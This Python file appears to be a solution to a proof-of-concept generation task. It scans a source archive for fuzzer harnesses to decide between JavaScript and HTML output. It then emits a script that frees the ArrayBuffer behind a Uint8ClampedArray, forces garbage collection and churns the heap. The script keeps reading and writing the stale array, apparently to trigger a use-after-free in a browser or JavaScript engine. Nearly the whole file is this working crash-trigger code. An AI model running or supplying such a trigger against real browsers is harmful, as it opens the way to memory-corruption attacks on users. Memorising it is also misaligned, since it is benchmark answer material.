import io
import os
import tarfile
from typing import Optional


class Solution:
    def _detect_input_kind(self, src_path: str) -> str:
        kind = "js"
        try:
            with tarfile.open(src_path, "r:*") as tf:
                members = tf.getmembers()
                candidates = []
                for m in members:
                    if not m.isfile():
                        continue
                    name = m.name
                    if m.size <= 0 or m.size > 2 * 1024 * 1024:
                        continue
                    lower = name.lower()
                    if not (lower.endswith(".cpp") or lower.endswith(".cc") or lower.endswith(".cxx") or lower.endswith(".c") or lower.endswith(".h") or lower.endswith(".hpp")):
                        continue
                    if "fuzz" in lower or "fuzzer" in lower or "llvmfuzzer" in lower:
                        candidates.append(m)
                if not candidates:
                    candidates = [m for m in members if m.isfile() and 0 < m.size <= 2 * 1024 * 1024 and m.name.lower().endswith((".cpp", ".cc", ".cxx", ".c"))]

                html_score = 0
                js_score = 0

                for m in candidates:
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read()
                    except Exception:
                        continue

                    if b"LLVMFuzzerTestOneInput" not in data and b"LLVMFuzzerInitialize" not in data:
                        if b"LLVMFuzzerTestOneInput" not in data:
                            continue

                    text = data.decode("utf-8", "ignore")
                    if ("LibWeb" in text) or ("Web::" in text) or ("HTML::Parser" in text) or ("DOM::Document" in text) or ("WebContent" in text) or ("PageClient" in text):
                        html_score += 10
                    if ("LibJS" in text) or ("JS::Parser" in text) or ("JS::Interpreter" in text) or ("JS::VM" in text):
                        js_score += 5
                    if ("parse_html" in text) or ("HTMLParser" in text) or ("load_html" in text):
                        html_score += 5
                    if ("parse_program" in text) or ("parse_script" in text) or ("run_file" in text):
                        js_score += 5

                    if html_score >= 10:
                        return "html"
                    if js_score >= 10 and html_score == 0:
                        kind = "js"

                if html_score > js_score:
                    kind = "html"
                else:
                    kind = "js"
        except Exception:
            kind = "js"
        return kind

    def _make_js(self) -> str:
        return r"""
(function () {
  function force_gc() {
    try { if (typeof gc === "function") gc(); } catch (e) {}
    try { if (typeof __gc === "function") __gc(); } catch (e) {}
    try { if (typeof collectGarbage === "function") collectGarbage(); } catch (e) {}
    try { if (typeof CollectGarbage === "function") CollectGarbage(); } catch (e) {}
  }

  function get_ctor() {
    if (typeof Uint8ClampedArray === "function")
      return Uint8ClampedArray;
    try {
      if (typeof ImageData === "function") {
        var img = new ImageData(1, 1);
        if (img && img.data && img.data.constructor)
          return img.data.constructor;
      }
    } catch (e) {}
    return null;
  }

  var C = get_ctor();
  if (!C)
    return;

  var victim = null;

  function make_victim() {
    var ab = new ArrayBuffer(0x1000);
    victim = new C(ab);
    victim[0] = 7;
    ab = null;
  }

  function churn() {
    var junk = [];
    for (var i = 0; i < 256; i++) {
      junk.push(new ArrayBuffer(0x1000));
      junk.push({ a: i, b: "x" + i, c: [i, i + 1, i + 2] });
    }
    return junk;
  }

  for (var k = 0; k < 32; k++) {
    make_victim();
    force_gc();
    var j = churn();
    force_gc();

    try { victim[0] = 13; } catch (e) {}
    try { var x = victim[0]; } catch (e) {}
    try { if (victim && victim.set) victim.set([1,2,3,4], 0); } catch (e) {}

    try {
      if (typeof Uint8Array === "function" && Uint8Array.prototype) {
        if (Uint8Array.prototype.set) Uint8Array.prototype.set.call(victim, [9,8,7,6], 0);
        if (Uint8Array.prototype.subarray) Uint8Array.prototype.subarray.call(victim, 0, 4);
        if (Uint8Array.prototype.copyWithin) Uint8Array.prototype.copyWithin.call(victim, 0, 0, 1);
      }
    } catch (e) {}

    j = null;
    force_gc();

    try { victim[1] = 42; } catch (e) {}
    try { var y = victim[1]; } catch (e) {}
  }
})();
""".lstrip()

    def _make_html(self, js_code: str) -> str:
        return (
            "<!doctype html>\n"
            "<meta charset=utf-8>\n"
            "<title>poc</title>\n"
            "<script>\n"
            + js_code
            + "\n</script>\n"
        )

    def solve(self, src_path: str) -> bytes:
        kind = self._detect_input_kind(src_path)
        js = self._make_js()
        if kind == "html":
            out = self._make_html(js)
        else:
            out = js
        return out.encode("utf-8", "strict")